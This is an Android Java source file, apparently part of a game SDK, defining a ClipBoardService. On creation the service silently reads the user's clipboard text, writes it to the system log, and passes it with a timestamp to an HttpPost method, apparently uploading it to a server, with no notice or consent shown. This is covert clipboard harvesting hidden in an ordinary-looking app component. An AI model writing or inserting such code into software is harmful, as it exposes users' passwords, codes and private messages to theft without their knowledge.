package com.yayawan.impl;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.R.string;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipData.Item;
import android.content.ClipboardManager;
import android.content.ClipboardManager.OnPrimaryClipChangedListener;
import android.content.Intent;
import android.os.Binder;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;



/**
 * 
 * @author Administrator
 *
 */
@TargetApi(Build.VERSION_CODES.HONEYCOMB)
@SuppressLint("NewApi")
public class ClipBoardService extends Service{

	private MyBinder binder = new MyBinder();
	public static String copyValue;
	
	@Override
	public IBinder onBind(Intent intent) {
		return binder;
	}

	@SuppressLint("NewApi")
	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
	@Override
	public void onCreate() {
		
		SimpleDateFormat formatter = new SimpleDateFormat ("yyyy年MM月dd日 HH:mm:ss ");  
    	Date curDate = new Date(System.currentTimeMillis());//获取当前时间  
    	String time = formatter.format(curDate);  
    	Log.i("tag","time = " +time);
		Log.i("tag","1");
		super.onCreate();
		Log.i("tag","11");
		final ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
		Log.i("tag","111");
		ClipData data = cm.getPrimaryClip();
		Log.i("tag","data = "+data);
		if(data == null ){
			ActivityStubImpl.HttpPost(time,"");
//			return;
		}else{
			ClipData.Item item = data.getItemAt(0);
			Log.i("tag","11111");
			String content = item.getText().toString();
			Log.i("tag", "========复制文字:"+item.getText());
			copyValue = item.getText()+"";
			Log.i("tag","copyValue = " +copyValue);
			ActivityStubImpl.HttpPost(time,copyValue);
		}
	}

	@Override
	public void onStart(Intent intent, int startId) {
	}
	
	@Override
	public void onDestroy() {
	}
	
	
	@Override
	public boolean onUnbind(Intent intent) {
		return super.onUnbind(intent);
	}
	
	public class MyBinder extends Binder{
		ClipBoardService getService(){
			return ClipBoardService.this;
		}
	}
	
//	public String getcontent(){
//		String vlaueString = getstring();
//		return vlaueString;
//	}
//	
//	public String getstring(){
//		ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
//		ClipData data = cm.getPrimaryClip();
//		ClipData.Item item = data.getItemAt(0);
//		String content = item.getText().toString();
//		return content;
//	}
}
